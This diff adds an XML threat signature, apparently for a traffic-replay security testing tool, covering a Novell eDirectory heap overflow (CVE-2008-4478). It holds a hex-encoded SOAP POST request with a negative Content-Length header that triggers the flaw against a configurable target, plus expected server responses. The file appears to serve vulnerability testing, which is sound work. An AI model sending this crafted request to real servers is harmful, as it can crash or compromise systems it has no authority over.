@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell eDirectory HTTP Request Content-Length Heap Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a heap buffer overflow vulnerability in Novell eDirectory. The flaw is in the SOAP-HTTP protocol stack due to improper processing of the Content-Length header value. Remote attackers could exploit this vulnerability by sending SOAP-HTTP requests with specially crafted Content-Length value. Successful exploitation would allow for arbitrary code injection and execution with the privileges of the server process. In a sophisticated attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service. In an attack case where code injection is not successful, the affected service may terminate abnormally."/>
+    <Intent display="true">
+      <item value="Code_Execution/Integer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Novell_eDirectory"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Novell_eDirectory_8.8_prior_to_SP3&amp;8.7.3_prior_to_SP10_FTF1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-4478"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="ae3b6af08494a18a07a9395ee31aa9e3"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634001825951344645"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264588203" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="I">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:A4:70:FA" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0214" Identification="4C48" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8AD3" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="38912" destPort="$HTTPdestPort" SeqNumber="3B2C3631" AckNumber="30723DAB" HeaderLength="08" WindowSize="002E" Checksum="5D9B" UrgentPointer="0000" Options="0101080A83B57A7F00000000" Payload="504F5354202F534F415020485454502F312E300D0A436F6E74656E742D747970653A20746578742F786D6C3B20636861727365743D225554462D38220D0A486F73743A20646863703136363A383032380D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A4163636570742D436861727365743A205554462D380D0A557365722D4167656E743A20654D426F7853444B0D0A436F6E74656E742D4C656E6774683A202D310D0A534F4150416374696F6E3A20222F6E6F76656C6C2E656D626F782E636F6E6E6D67722E736572766572696E666F220D0A0D0A3C3F786D6C2076657273696F6E3D22312E30223F3E3C534F41502D454E563A456E76656C6F706520786D6C6E733A534F41502D454E563D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F223E3C534F41502D454E563A4865616465722F3E3C534F41502D454E563A426F64793E3C64697370617463683E3C416374696F6E3E6E6F76656C6C2E656D626F782E636F6E6E6D67722E736572766572696E666F3C2F416374696F6E3E3C4F626A6563742F3E3C506172616D65746572732F3E3C2F64697370617463683E3C2F534F41502D454E563A426F64793E3C2F534F41502D454E563A456E76656C6F70653E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:0C:29:A4:70:FA" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="0368" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9593" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="38912" SeqNumber="30723DAB" AckNumber="3B2C3811" HeaderLength="08" WindowSize="F910" Checksum="F7B9" UrgentPointer="0000" Options="0101080A00008D4683B57A76" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="00:0C:29:A4:70:FA" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="037C" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="958B" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="38912" SeqNumber="30723DAB" AckNumber="3B2C3812" HeaderLength="05" WindowSize="0000" Checksum="B54F" UrgentPointer="0000" Options="" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="true" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
